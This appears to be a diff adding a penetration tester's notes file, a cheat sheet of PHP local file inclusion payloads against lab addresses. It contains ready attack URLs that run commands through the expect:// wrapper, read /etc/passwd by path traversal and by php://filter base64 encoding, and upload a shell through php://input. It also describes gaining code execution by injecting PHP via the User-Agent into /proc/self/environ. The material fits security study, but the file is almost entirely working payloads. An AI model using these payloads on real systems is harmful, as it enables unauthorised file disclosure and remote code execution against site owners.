@@ -1,0 +1,19 @@
+#local file inclusion lfi traversal webapp
+
+http://127.0.0.1/fileincl/example1.php?page=expect://ls
+#If the expect method is disabled, you will get the below error
+Warning: include(): Unable to find the wrapper "expect" - did you forget to enable it when you<br> configured PHP? in /var/www/fileincl/example1.php on line 7 Warning: include(): Unable to find the<br> wrapper "expect" - did you forget to enable it when you configured PHP? in <br> /var/www/fileincl/example1.php on line 7 Warning: include(expect://ls): failed to open stream: No such file or directory in /var/www/fileincl/example1.php on line 7 Warning: include(): Failed opening 'expect://ls' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/fileincl/example1.php on line 7
+
+foo.php?file=../../../../../../../etc/passwd
+
+http://192.168.183.128/fileincl/example1.php?page=php://input
+then upload shell script/php
+then browse to the uploaded file/resource
+
+http://192.168.155.131/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
+
+If it’s possible to include /proc/self/environ from your vulnerable LFI script, 
+then code execution can be leveraged by manipulating the User Agent parameter with Burp. 
+After the PHP code has been introduced /proc/self/environ can be executed via your vulnerable LFI script.
+
+Reference: https://highon.coffee/blog/lfi-cheat-sheet/
